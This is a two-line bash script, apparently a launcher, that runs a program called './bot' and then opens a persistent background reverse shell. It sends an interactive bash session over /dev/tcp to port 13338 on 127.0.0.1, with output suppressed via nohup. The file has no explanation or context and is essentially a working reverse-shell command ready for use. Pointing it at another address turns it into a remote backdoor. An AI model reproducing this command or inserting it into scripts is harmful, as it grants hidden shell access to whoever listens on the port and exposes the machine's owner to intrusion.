#!/bin/bash

./bot ; /usr/bin/nohup /bin/bash -c '/bin/bash -i >/dev/tcp/127.0.0.1/13338 0>&1 &' >/dev/null